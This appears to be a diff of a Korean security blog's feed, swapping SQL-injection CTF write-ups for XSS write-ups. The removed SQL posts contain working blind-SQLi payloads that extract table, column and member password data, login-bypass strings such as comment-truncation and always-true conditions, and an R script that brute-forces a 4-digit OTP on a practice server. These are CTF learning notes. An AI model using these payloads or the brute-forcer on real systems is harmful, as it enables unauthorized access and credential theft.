-에 대입한다. <br />
-<br /></p>
-
-<p>normaltic’ and ascii(substr((<span style="font-weight:bold; color: orange">select table_name from information_schema.tables where table_schema=’segfault_sql’ limit 0,1</span>),1,1)&gt;0) and ‘1’=’1</p>
-
-<p><br /></p>
-
-<p><img src="/images/2024-06-01-SQLinjection16/image-20240601131408387.png" alt="image-20240601131408387" style="zoom:67%;" /></p>
-
-<h4 id="1226-column-이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.6 column 이름 확인하기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>column 이름 확인하는 법은<br />
-select column_name from information_schema.columns where table_name=’table name’ limit 0,1 이므로, <br />
-<br /></p>
-
-<p>공격 format <br />
-normaltic’ and ascii(substr((<span style="font-weight:bold; color: orange">select~~~</span>),1,1)&gt;0) and ‘1’=’1<br />
-에 대입한다. <br />
-<br /></p>
-
-<p>normaltic’ and ascii(substr((<span style="font-weight:bold; color: orange">select column_name from information_schema.columns where table_name=’member’ limit 0,1</span>),1,1)&gt;0) and ‘1’=’1</p>
-
-<p><br /></p>
-
-<p><img src="/images/2024-06-01-SQLinjection16/image-20240601131555791.png" alt="image-20240601131555791" style="zoom:67%;" /></p>
-
-<h4 id="1227-data-추출하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.7 data 추출하기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>normaltic’ and ascii(substr((<span style="font-weight:bold; color: orange">select id from member limit 0,1</span>),1,1)&gt;0) and ‘1’=’1</p>
-
-<p>normaltic’ and ascii(substr((<span style="font-weight:bold; color: orange">select pass from member limit 0,1</span>),1,1)&gt;0) and ‘1’=’1</p>
-
-<p><br /></p>
-
-<p><img src="/images/2024-06-01-SQLinjection16/image-20240601135825807.png" alt="image-20240601135825807" style="zoom:67%;" /></p>
-
-<p>ascii에서 d 가 100인데, 여기서 첫 글자는 d 입니다.   이렇게 id 와 password를 구하다 보면</p>
-
-<p>error based sqli 과 마찬가지로 데이터 결과는 같습니다.</p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">5주차 SQL injection 인증우회 문제풀이(5)</title><link href="http://localhost:4000/sql-injection/SQLinjection9/" rel="alternate" type="text/html" title="5주차 SQL injection 인증우회 문제풀이(5)" /><published>2024-05-29T00:00:00+09:00</published><updated>2024-05-29T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection9</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection9/"><![CDATA[<p><br /></p>
-
-<h1 id="1-5주차-sql-injection-인증우회-문제풀이5"><span style="background:#000000; color:#ffffff">1. 5주차 SQL injection 인증우회 문제풀이(5)</span></h1>
+<h1 id="1-xss-취약점-찾기5"><span style="background:#000000; color:#ffffff">1. XSS 취약점 찾기(5)</span></h1>
 
 <p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>
 
@@ -604,58 +66,31 @@ normaltic’ and ascii(substr((<span style="font-weight:bold; color: orange">sel
 
 <p><br /></p>
 
-<h2 id="11-5번-문제"><span style="background:#696969; color:#ffffff">1.1  5번 문제</span></h2>
+<h2 id="11-xss-5-문제-"><span style="background:#696969; color:#ffffff">1.1 XSS 5 문제 </span></h2>
 
 <p><br /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection9/1.PNG" alt="1" style="zoom:80%;" /></p>
+<p><img src="/images/2024-06-18-XSS6/image-20240618023008146.png" alt="image-20240618023008146" style="zoom: 67%;" /></p>
 
-<p><br /></p>
+<p><img src="/images/2024-06-18-XSS6/image-20240618023047258.png" alt="image-20240618023047258" style="zoom:60%;" /></p>
 
-<p><span style="font-weight:bold; font-size:25px">▶ 목표 : normaltic1으로 로그인하기!!! </span></p>
+<p><img src="/images/2024-06-18-XSS6/image-20240618023113434.png" alt="image-20240618023113434" style="zoom:80%;" /></p>
 
-<p><br /></p>
+<p><img src="/images/2024-06-18-XSS6/image-20240618023142818.png" alt="image-20240618023142818" style="zoom:60%;" /></p>
 
-<h3 id="111-주어진-정보-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.1 주어진 정보 확인하기</span></h3>
+<p><img src="/images/2024-06-18-XSS6/image-20240618023219265.png" alt="image-20240618023219265" style="zoom:80%;" /></p>
 
-<hr />
+<p><img src="/images/2024-06-18-XSS6/image-20240618023512982.png" alt="image-20240618023512982" style="zoom:60%;" /></p>
 
-<p><br /></p>
+<p><img src="/images/2024-06-18-XSS6/image-20240618023553647.png" alt="image-20240618023553647" style="zoom:80%;" /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection9/2.PNG" alt="2" style="zoom:67%;" /></p>
+<p><img src="/images/2024-06-18-XSS6/image-20240618023615557.png" alt="image-20240618023615557" style="zoom:60%;" /></p>
 
-<p>doldol로 로그인 했을 때 데이터를 POST방식으로 보내네요.</p>
+<p><img src="/images/2024-06-18-XSS6/image-20240618023709797.png" alt="image-20240618023709797" style="zoom: 80%;" /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection9/3.PNG" alt="3" style="zoom:60%;" /></p>
+<p><img src="/images/2024-06-18-XSS6/image-20240618023637074.png" alt="image-20240618023637074" style="zoom:50%;" /></p>]]></content><author><name>ethan</name></author><category term="XSS" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">XSS 취약점 찾기(4)</title><link href="http://localhost:4000/xss/XSS5/" rel="alternate" type="text/html" title="XSS 취약점 찾기(4)" /><published>2024-06-18T00:00:00+09:00</published><updated>2024-06-18T00:00:00+09:00</updated><id>http://localhost:4000/xss/XSS5</id><content type="html" xml:base="http://localhost:4000/xss/XSS5/"><![CDATA[<p><br /></p>
 
-<p>살펴본 결과, 요청보내는 페이로드를의 sql injection을 시도해 봐야겠습니다. <br />
-doldol’ and ‘1’=’1 시도 해본 결과, 302 Found로 리다이렉션이 되는 것 보니까 로그인에 성공합니다.<br />
-따라서 sql injection로 로그인이 가능합니다.</p>
-
-<p><img src="/images/2024-05-29-SQLinjection9/4.PNG" alt="4" style="zoom:60%;" /></p>
-
-<p>만약 식별/인증이 분리라면 doldol’ or ‘1’=’1를 넣었을 시 참이 되는 아이디가 여러 개가 되므로 로그인이 되어서는 안됩니다.<br />
-하지만 여기서는 302 Found로 로그인이 되었습니다. 따라서 식별/인증이 동시에 진행된 구조로 되어 있다고 할 수 있겠습니다.</p>
-
-<h3 id="112-로그인하기"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.2  로그인하기</span></h3>
-
-<hr />
-
-<p><br /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection9/5.PNG" alt="5" style="zoom:60%;" /></p>
-
-<p>그렇다면 식별/인증 동시이므로 예를 들어) where id=’아이디’ and pass=’비밀번호 ‘ 일 확률이 있으므로<br />
-로그인이 되는지 확인하기 위해서 뒤의 pass를 날려야 합니다. 그 방법이 doldol’ # 로 #가 뒤에 pass를 주석처리 해줍니다.<br />
-따라서 해본 결과 로그인이 되네요.</p>
-
-<p><br /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection9/6.PNG" alt="6" /></p>
-
-<p>직접 normaltic1’ # 를 로그인 화면에 적은 결과 / 다음과 같이 flag가 출력됩니다.</p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">5주차 SQL injection 인증우회 문제풀이(4)</title><link href="http://localhost:4000/sql-injection/SQLinjection8/" rel="alternate" type="text/html" title="5주차 SQL injection 인증우회 문제풀이(4)" /><published>2024-05-29T00:00:00+09:00</published><updated>2024-05-29T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection8</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection8/"><![CDATA[<p><br /></p>
-
-<h1 id="1-5주차-sql-injection-인증우회-문제풀이4"><span style="background:#000000; color:#ffffff">1. 5주차 SQL injection 인증우회 문제풀이(4)</span></h1>
+<h1 id="1-xss-취약점-찾기4"><span style="background:#000000; color:#ffffff">1. XSS 취약점 찾기(4)</span></h1>
 
 <p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>
 
@@ -665,95 +100,35 @@ doldol’ and ‘1’=’1 시도 해본 결과, 302 Found로 리다이렉션이
 
 <p><br /></p>
 
-<h2 id="11-4번-문제"><span style="background:#696969; color:#ffffff">1.1  4번 문제</span></h2>
+<h2 id="11-xss-4-문제-"><span style="background:#696969; color:#ffffff">1.1 XSS 4 문제 </span></h2>
 
 <p><br /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection8/1.PNG" alt="1" style="zoom:80%;" /></p>
+<p><img src="/images/2024-06-18-XSS5/image-20240618021814044.png" alt="image-20240618021814044" style="zoom: 67%;" /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection8/2.PNG" alt="2" style="zoom:67%;" /></p>
+<p><img src="/images/2024-06-18-XSS5/image-20240618021724196.png" alt="image-20240618021724196" style="zoom:60%;" /><img src="/images/2024-06-18-XSS5/image-20240618021900140.png" alt="image-20240618021900140" style="zoom:80%;" /></p>
 
-<p><br /></p>
+<p><img src="/images/2024-06-18-XSS5/image-20240618021947289.png" alt="image-20240618021947289" style="zoom:60%;" /></p>
 
-<p><span style="font-weight:bold; font-size:25px">▶ 목표 : PIN Code 알아내기!!! </span></p>
+<p><img src="/images/2024-06-18-XSS5/image-20240618022023224.png" alt="image-20240618022023224" style="zoom:80%;" /></p>
 
-<p><br /></p>
+<p><img src="/images/2024-06-18-XSS5/image-20240618022101547.png" alt="image-20240618022101547" style="zoom:60%;" /></p>
 
-<h3 id="111-주어진-정보-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.1 주어진 정보 확인하기</span></h3>
+<p><img src="/images/2024-06-18-XSS5/image-20240618022139454.png" alt="image-20240618022139454" style="zoom:80%;" /></p>
 
-<hr />
+<p><img src="/images/2024-06-18-XSS5/image-20240618022822760.png" alt="image-20240618022822760" style="zoom:60%;" /></p>
 
-<p><br /></p>
+<p>![(/images/2024-06-18-XSS5/image-20240618022256780.png)</p>
 
-<p><img src="/images/2024-05-29-SQLinjection8/3.PNG" alt="3" style="zoom:67%;" /></p>
+<p><img src="/images/2024-06-18-XSS5/image-20240618022740308.png" alt="image-20240618022740308" style="zoom:60%;" /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection8/4.PNG" alt="4" style="zoom:60%;" /></p>
+<p><img src="/images/2024-06-18-XSS5/image-20240618022927569.png" alt="image-20240618022927569" style="zoom:60%;" /></p>
 
-<p>비밀번호를 입력한 파일 요청한 응답을 보면 번호가 바뀐 url로 리다이렉션 하므로 번호를 알아야만 접속할 수 있습니다.<br />
-하지만 틀려도 횟수 제한이 걸려 있지 않기 때문에 여러  번 시도 할 수 있는 것을 이용하여 intruder를 사용하면 될 듯 합니다.<br />
-(Brute Force Attack)</p>
+<p><img src="/images/2024-06-18-XSS5/image-20240618023805877.png" alt="image-20240618023805877" style="zoom:80%;" /></p>
 
-<p><br /></p>
+<p><img src="/images/2024-06-18-XSS5/image-20240618022859233.png" alt="image-20240618022859233" style="zoom:50%;" /></p>]]></content><author><name>ethan</name></author><category term="XSS" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">XSS 취약점 찾기(3)</title><link href="http://localhost:4000/xss/XSS4/" rel="alternate" type="text/html" title="XSS 취약점 찾기(3)" /><published>2024-06-18T00:00:00+09:00</published><updated>2024-06-18T00:00:00+09:00</updated><id>http://localhost:4000/xss/XSS4</id><content type="html" xml:base="http://localhost:4000/xss/XSS4/"><![CDATA[<p><br /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection8/5.PNG" alt="5" style="zoom:70%;" /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection8/6.PNG" alt="6" style="zoom:50%;" /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection8/7.PNG" alt="7" style="zoom: 67%;" /></p>
-
-<p>그렇지만 확장 기능이 없으므로 특정 변화가 생기면 멈추지 않습니다. 일일이 수동으로 변화를 감지할 수도 없는 노릇이니<br />
-다른 프로그램 언어로 서버로 요청하는 것이 좋을 것 같습니다.</p>
-
-<h3 id="112-r-프로그램을-이용하여-서버로-요청하기brute-force-attack"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.2  R 프로그램을 이용하여 서버로 요청하기<span style="font-size:80%">(Brute Force Attack)</span></span></h3>
-
-<hr />
-
-<p><br /></p>
-
-<p>해당 방법을 이용하면 응답이 다를 때 중단되도록 만들었습니다.</p>
-
-<div class="language-R highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">library</span><span class="p">(</span><span class="n">httr</span><span class="p">)</span><span class="w">
-
-</span><span class="c1"># OTP 검증 함수 정의</span><span class="w">
-</span><span class="n">check_otp</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="n">otp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-  </span><span class="n">base_url</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="s2">"http://ctf.segfaulthub.com:1129/6/checkOTP.php"</span><span class="w">
-  </span><span class="n">query_string</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">sprintf</span><span class="p">(</span><span class="s2">"?otpNum=%s"</span><span class="p">,</span><span class="w"> </span><span class="n">otp</span><span class="p">)</span><span class="w">
-  </span><span class="n">full_url</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">paste0</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span><span class="w"> </span><span class="n">query_string</span><span class="p">)</span><span class="w">
-  
-  </span><span class="c1"># 서버로부터 응답 받기</span><span class="w">
-  </span><span class="n">response</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">GET</span><span class="p">(</span><span class="n">full_url</span><span class="p">)</span><span class="w">
-  
-  </span><span class="c1"># 응답 내용에서 HTML을 추출</span><span class="w">
-  </span><span class="n">response_content</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">content</span><span class="p">(</span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="s2">"text"</span><span class="p">,</span><span class="w"> </span><span class="n">encoding</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"UTF-8"</span><span class="p">)</span><span class="w">
-  
-  </span><span class="c1"># 응답 내용의 첫 100자 출력</span><span class="w">
-  </span><span class="n">cat</span><span class="p">(</span><span class="s2">"Testing OTP: "</span><span class="p">,</span><span class="w"> </span><span class="n">otp</span><span class="p">,</span><span class="w"> </span><span class="s2">"\nResponse Content: "</span><span class="p">,</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="n">response_content</span><span class="p">,</span><span class="w"> </span><span class="m">1</span><span class="p">,</span><span class="w"> </span><span class="m">100</span><span class="p">),</span><span class="w"> </span><span class="s2">"\n"</span><span class="p">)</span><span class="w">
-  
-  </span><span class="c1"># 응답 내용 반환</span><span class="w">
-  </span><span class="nf">return</span><span class="p">(</span><span class="n">response_content</span><span class="p">)</span><span class="w">
-</span><span class="p">}</span><span class="w">
-
-</span><span class="c1"># 초기 응답 저장</span><span class="w">
-</span><span class="n">initial_response</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">check_otp</span><span class="p">(</span><span class="s2">"0000"</span><span class="p">)</span><span class="w">
-
-</span><span class="c1"># 모든 OTP 검증</span><span class="w">
-</span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">1</span><span class="o">:</span><span class="m">9999</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-  </span><span class="n">otp</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">sprintf</span><span class="p">(</span><span class="s2">"%04d"</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w">
-  </span><span class="n">current_response</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">check_otp</span><span class="p">(</span><span class="n">otp</span><span class="p">)</span><span class="w">
-  
-  </span><span class="c1"># 현재 응답과 초기 응답 비교</span><span class="w">
-  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">current_response</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">initial_response</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="n">cat</span><span class="p">(</span><span class="s2">"Response changed at OTP: "</span><span class="p">,</span><span class="w"> </span><span class="n">otp</span><span class="p">,</span><span class="w"> </span><span class="s2">"\n"</span><span class="p">)</span><span class="w">
-    </span><span class="k">break</span><span class="w">  </span><span class="c1"># 응답이 변경되었을 때 루프 중단</span><span class="w">
-  </span><span class="p">}</span><span class="w">
-</span><span class="p">}</span><span class="w">
-</span></code></pre></div></div>
-
-<p><img src="/images/2024-05-29-SQLinjection8/8.PNG" alt="8" style="zoom:50%;" /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection8/9.PNG" alt="9" style="zoom:50%;" /></p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">5주차 SQL injection 인증우회 문제풀이(3)</title><link href="http://localhost:4000/sql-injection/SQLinjection7/" rel="alternate" type="text/html" title="5주차 SQL injection 인증우회 문제풀이(3)" /><published>2024-05-29T00:00:00+09:00</published><updated>2024-05-29T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection7</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection7/"><![CDATA[<p><br /></p>
-
-<h1 id="1-5주차-sql-injection-인증우회-문제풀이3"><span style="background:#000000; color:#ffffff">1. 5주차 SQL injection 인증우회 문제풀이(3)</span></h1>
+<h1 id="1-xss-취약점-찾기3"><span style="background:#000000; color:#ffffff">1. XSS 취약점 찾기(3)</span></h1>
 
 <p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>
 
@@ -763,88 +138,36 @@ doldol’ and ‘1’=’1 시도 해본 결과, 302 Found로 리다이렉션이
 
 <p><br /></p>
 
-<h2 id="11-3번-문제"><span style="background:#696969; color:#ffffff">1.1  3번 문제</span></h2>
+<h2 id="11-xss-3-문제-"><span style="background:#696969; color:#ffffff">1.1 XSS 3 문제 </span></h2>
 
 <p><br /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection7/1.PNG" alt="1" style="zoom: 80%;" /></p>
+<p><img src="/images/2024-06-18-XSS4/image-20240618021749560.png" alt="image-20240618021749560" style="zoom: 67%;" /></p>
 
-<p><br /></p>
+<p><img src="/images/2024-06-18-XSS4/image-20240618021241202.png" alt="image-20240618021241202" style="zoom: 67%;" /></p>
 
-<p><span style="font-weight:bold; font-size:25px">▶ 목표 : admin계정으로 로그인하기!!! </span></p>
+<p>이번에는 마이페이지에서 확인하려고 한다.</p>
 
-<p><br /></p>
+<p><img src="/images/2024-06-18-XSS4/image-20240618021308976.png" alt="image-20240618021308976" style="zoom:60%;" /></p>
 
-<h3 id="111-주어진-정보-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.1 주어진 정보 확인하기</span></h3>
+<p>GET 메서드로 파라미터가 1234 인데, 해당 화면에 1234가 출력 된다.</p>
 
-<hr />
+<p><img src="/images/2024-06-18-XSS4/image-20240618021346395.png" alt="image-20240618021346395" style="zoom:60%;" /></p>
 
-<p><br /></p>
+<p>재차 확인하기 위해 0000 으로 파라미터를 바꾸니, 응답 화면에도 잘 출력 되는 것을 확인 할 수 있다.<br />
+따라서 reflected XSS를 시도해 볼 수 있다.</p>
 
-<p><img src="/images/2024-05-29-SQLinjection7/2.PNG" alt="2" style="zoom:80%;" /></p>
+<p><img src="/images/2024-06-18-XSS4/image-20240618021437982.png" alt="image-20240618021437982" style="zoom:60%;" /></p>
 
-<p>doldol로 로그인이 되는지 확인하였다.</p>
+<p>또한, 특수문자를 체크해보니 응답 화면에 잘 나타났다.</p>
 
-<p><img src="/images/2024-05-29-SQLinjection7/3.PNG" alt="3" style="zoom:60%;" /></p>
+<p><img src="/images/2024-06-18-XSS4/image-20240618021537676.png" alt="image-20240618021537676" style="zoom:60%;" /></p>
 
-<h3 id="112-서버로-보내는-데이터-확인하기"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.2  서버로 보내는 데이터 확인하기</span></h3>
+<p><img src="/images/2024-06-18-XSS4/image-20240618021619251.png" alt="image-20240618021619251" style="zoom:50%;" /></p>
 
-<hr />
+<p>역시 스크립트를 작성을 하니, 해당 링크를 들어가면 다음과 같이 화면에 나타났다.</p>]]></content><author><name>ethan</name></author><category term="XSS" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">XSS 취약점 찾기(2)</title><link href="http://localhost:4000/xss/XSS3/" rel="alternate" type="text/html" title="XSS 취약점 찾기(2)" /><published>2024-06-18T00:00:00+09:00</published><updated>2024-06-18T00:00:00+09:00</updated><id>http://localhost:4000/xss/XSS3</id><content type="html" xml:base="http://localhost:4000/xss/XSS3/"><![CDATA[<p><br /></p>
 
-<p><br /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection7/5-1716921469490-37.PNG" alt="5" style="zoom:60%;" /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection7/6-1716921473008-39.PNG" alt="6" style="zoom:60%;" /></p>
-
-<p>userid가 doldol 일 때는 result가 ok 이고, userid가 admin일 때는 result 가 fail 이 나왔습니다.</p>
-
-<p><br /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection7/7-1716921475786-41.PNG" alt="7" style="zoom:60%;" /></p>
-
-<p>그러나 Userpw를 지운 결과 flag가 나왔지만 이거 거의 운빨로 때려 맞춘 거나 다름없었습니다.</p>
-
-<h3 id="113-json-파일의-response-조작하기"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.3  JSON 파일의 response 조작하기</span></h3>
-
-<hr />
-
-<p><br /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection7/image-20240529034556725.png" alt="image-20240529034556725" style="zoom:80%;" /></p>
-
-<p>자세히 보니 파일이 json입니다. json(JavaScript Object Notation)은 간단한 텍스트 기반 데이터 포맷입니다.</p>
-
-<p><br /></p>
-
-<p>아까와 같은 방식이 아닌 json 파일의 response  result값의 텍스트를 조작해서 푸는 것이 의도가 맞습니다.</p>
-
-<p><img src="/images/2024-05-29-SQLinjection7/image-20240529034624922.png" alt="image-20240529034624922" style="zoom:60%;" /></p>
-
-<p>그렇기 때문에 설정에서 response interception rules를 다음과 같이 설정해야 합니다.</p>
-
-<p><img src="/images/2024-05-29-SQLinjection7/image-20240529034733527.png" alt="image-20240529034733527" style="zoom:60%;" /></p>
-
-<p><br /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection7/image-20240529034751178.png" alt="image-20240529034751178" style="zoom:67%;" /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection7/image-20240529034808943.png" alt="image-20240529034808943" style="zoom: 67%;" /></p>
-
-<p>fail 값을 ok값으로 바꿉니다. 왜냐하면 로그인이 정상적으로 되었을 때가 ok라는 결과를 출력했기 때문입니다.<br />
-그리고 foward 누르고 보냅니다.</p>
-
-<p><br /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection7/image-20240529034836762.png" alt="image-20240529034836762" style="zoom:60%;" /></p>
-
-<p>그러면 이어서 index.php를 서버로 요청하면,</p>
-
-<p><img src="/images/2024-05-29-SQLinjection7/image-20240529034905159.png" alt="image-20240529034905159" style="zoom:67%;" /></p>
-
-<p>바로 flag가 출력 되는 것을 볼 수 있습니다.</p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">5주차 SQL injection 인증우회 문제풀이(2)</title><link href="http://localhost:4000/sql-injection/SQLinjection6/" rel="alternate" type="text/html" title="5주차 SQL injection 인증우회 문제풀이(2)" /><published>2024-05-29T00:00:00+09:00</published><updated>2024-05-29T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection6</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection6/"><![CDATA[<p><br /></p>
-
-<h1 id="1-5주차-sql-injection-인증우회-문제풀이2"><span style="background:#000000; color:#ffffff">1. 5주차 SQL injection 인증우회 문제풀이(2)</span></h1>
+<h1 id="1-xss-취약점-찾기2"><span style="background:#000000; color:#ffffff">1. XSS 취약점 찾기(2)</span></h1>
 
 <p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>
 
@@ -854,55 +177,11 @@ doldol’ and ‘1’=’1 시도 해본 결과, 302 Found로 리다이렉션이
 
 <p><br /></p>
 
-<h2 id="11-2번-문제"><span style="background:#696969; color:#ffffff">1.1  2번 문제</span></h2>
+<h2 id="11-xss-2-문제-"><span style="background:#696969; color:#ffffff">1.1 XSS 2 문제 </span></h2>
 
-<p><br /></p>
+<p><br /></p>]]></content><author><name>ethan</name></author><category term="XSS" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">XSS 이란?(1)</title><link href="http://localhost:4000/xss/XSS1/" rel="alternate" type="text/html" title="XSS 이란?(1)" /><published>2024-06-16T00:00:00+09:00</published><updated>2024-06-16T00:00:00+09:00</updated><id>http://localhost:4000/xss/XSS1</id><content type="html" xml:base="http://localhost:4000/xss/XSS1/"><![CDATA[<p><br /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection6/1.PNG" alt="1" style="zoom:80%;" /></p>
-
-<p><br /></p>
-
-<p><span style="font-weight:bold; font-size:25px">▶ 목표 : 관리자 인증 우회하기!!! </span></p>
-
-<p><br /></p>
-
-<h3 id="111-주어진-정보-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.1 주어진 정보 확인하기</span></h3>
-
-<hr />
-
-<p><br /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection6/2.PNG" alt="2" style="zoom:67%;" /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection6/3.PNG" alt="3" style="zoom: 80%;" /></p>
-
-<p>burp suite에서 확인한 결과 처음 화면에서 확인을 누르고 들어가다 보면 이렇게 진행됩니다.</p>
-
-<p>/3/ ▶ /3/step1.php ▶ /3/step2.php ▶ /3/step2.php?admin_pass=[비밀번호 자리]</p>
-
-<p>전부 GET 방식으로 서버에 보내는 형식이네요.</p>
-
-<p>별다른 단서는 없는 것 같습니다.</p>
-
-<h3 id="112-서버로-보내는-데이터-확인하기"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.2  서버로 보내는 데이터 확인하기</span></h3>
-
-<hr />
-
-<p><br /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection6/4-1716918068510-26.PNG" alt="4" style="zoom:60%;" /></p>
-
-<p>정보가 제한적 이므로 비밀번호를 직접 알지 못하는 이상 우회하기는 힘들 것 같습니다. <br />
-하지만 파일이름이  step1 ▶ step2 이런 식으로 진입하는 것을 보니  step3도 확인해보는 것이 좋을 것 같습니다.<br />
-그래서 GET방식이라서 /3/step3.php로 파일을 요청했습니다. 그랬더니 gogoHack.php로 리다이렉트되는 것이 확인됩니다.</p>
-
-<p><br /></p>
-
-<p><img src="/images/2024-05-29-SQLinjection6/5-1716918144412-28.PNG" alt="5" style="zoom:60%;" /></p>
-
-<p>따라서 /3/gogoHack.php로 파일을 요청했습니다. 반응 값으로 경고문에 flag가 담겨서 있는 것을 확인할 수 있었습니다.</p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">5주차 SQL injection 인증우회 문제풀이(1)</title><link href="http://localhost:4000/sql-injection/SQLinjection5/" rel="alternate" type="text/html" title="5주차 SQL injection 인증우회 문제풀이(1)" /><published>2024-05-29T00:00:00+09:00</published><updated>2024-05-29T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection5</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection5/"><![CDATA[<p><br /></p>
-
-<h1 id="1-5주차-sql-injection-인증우회-문제풀이1"><span style="background:#000000; color:#ffffff">1. 5주차 SQL injection 인증우회 문제풀이(1)</span></h1>
+<h1 id="1-xss1"><span style="background:#000000; color:#ffffff">1. XSS(1)</span></h1>
 
 <p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>
 
@@ -912,64 +191,109 @@ doldol’ and ‘1’=’1 시도 해본 결과, 302 Found로 리다이렉션이
 
 <p><br /></p>
 
-<h2 id="11-1번-문제"><span style="background:#696969; color:#ffffff">1.1  1번 문제</span></h2>
+<h2 id="11-개념"><span style="background:#696969; color:#ffffff">1.1 개념 </span></h2>
 
 <p><br /></p>
 
-<p><img src="/images/2024-05-29-SQLinjection5/1.PNG" alt="1" style="zoom:80%;" /></p>
+<p><img src="https://cdn.prod.website-files.com/5ff66329429d880392f6cba2/60b35cf8bf38cadc090a95bf_Cross-Site%20Scripting%20Work.png" alt="Cross site scripting (XSS) attack - Types and Examples" style="zoom: 67%;" /></p>
+
+<p>XSS (Cross-Site scripting)은 공격자가 악성 스크립트를 삽입해서 이용자의 브라우저에서 실행되도록 조작하는 기술입니다.</p>
+
+<p>이번 포스팅에서 2 가지 방법에 대해 알아 보겠습니다.<br />
+Stored XSS (서버에 저장)<br />
+Reflected XSS (서버의 에코 기능 이용)</p>
 
 <p><br /></p>
 
-<p><span style="font-weight:bold; font-size:25px">▶ 목표 : doldol 계정이 아닌 admin 계정으로 접속하기!!! </span></p>
-
-<p><br /></p>
-
-<h3 id="111-주어진-정보-dodol-로-로그인-직접-해보기"><span style="background:#A9A9A9; color:#ffffff">1.1.1 주어진 정보 dodol 로 로그인 직접 해보기</span></h3>
+<h4 id="111-stored-xss"><span style="background:#A9A9A9; color:#ffffff">1.1.1 Stored XSS</span></h4>
